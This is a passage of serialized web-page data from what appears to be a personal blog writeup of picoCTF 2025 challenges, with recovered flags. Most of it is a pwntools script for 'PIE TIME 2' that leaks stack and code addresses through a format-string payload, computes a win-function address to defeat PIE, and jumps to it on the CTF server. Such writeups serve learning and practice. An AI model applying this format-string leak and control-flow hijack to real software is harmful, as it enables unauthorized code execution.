picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$19"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"PIE TIME 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from pwn import *\n\np = remote(\"rescued-float.picoctf.net\", 64931)\n\np.recvuntil(b\"name:\")\npayload = b\"aaaaaaab.%8$p.%25$p.\"  # buffer\np.sendline(payload)\n# %8$p: start of buffer\n# %25$p: main\n\nresp = p.recvuntil(b\": \")\nprint(\n    \"resp:\", resp\n)  # resp: b'aaaaaaab.0x6261616161616161.0x5fe907376400.\\n enter the address to jump to, ex => 0x12345: '\n\nmain = resp.split(b\".\")[2]\nmain = int(main, 16)\nprint(\"main:\", hex(main))\n\nwin = main + 0x136A - 0x1400\nwin = hex(win)\n\np.sendline(str(win).encode())\nprint(p.recvall())\n\n# picoCTF{p13_5h0u1dn'7_134k_8c8ae861}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1a"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Echo Valley"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$1b"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1c"}}]}]]}]]
+c:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"picoCTF 2025 Writeup - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/25a/wp-picoctf-2025/"}]]
+1:null
